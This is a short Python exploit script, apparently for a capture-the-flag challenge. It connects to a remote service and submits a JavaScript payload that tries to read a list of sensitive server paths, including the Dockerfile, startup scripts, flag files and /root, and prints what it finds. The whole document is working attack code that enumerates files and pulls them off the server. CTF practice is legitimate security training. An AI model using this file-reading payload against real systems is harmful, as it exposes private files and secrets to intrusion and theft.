import json
import socket

HOST, PORT = 'ctf.vulnbydefault.com', 38871

candidates = [
    '/Dockerfile', '/dockerfile', '/compose.yml', '/docker-compose.yml',
    '/docker-compose.yaml', '/entrypoint.sh', '/start.sh', '/run.sh',
    '/server.py', '/app.py', '/challenge.py', '/jail.py', '/init.sh',
    '/launch.sh', '/wrapper.py', '/xinetd.sh', '/flag', '/flag.txt', '/FLAG',
    '/FLAG.txt', '/proof.txt', '/readme', '/README', '/README.md', '/note.txt',
    '/home', '/root', '/tmp', '/opt', '/srv'
]

js = "const cands=" + json.dumps(candidates) + ";\n"
js += "for (const p of cands){try{let x=read(p);print('FOUND '+p+' LEN '+x.length); if (x.length<2000) print(String(x));}catch(e){}}\n"

s = socket.create_connection((HOST, PORT), timeout=20)
s.recv(4096)
s.sendall((str(len(js)) + "\n").encode())
s.recv(4096)
s.sendall(js.encode())
s.shutdown(socket.SHUT_WR)

out = b''
while True:
    d = s.recv(262144)
    if not d:
        break
    out += d

print(out.decode('latin1', errors='replace'))
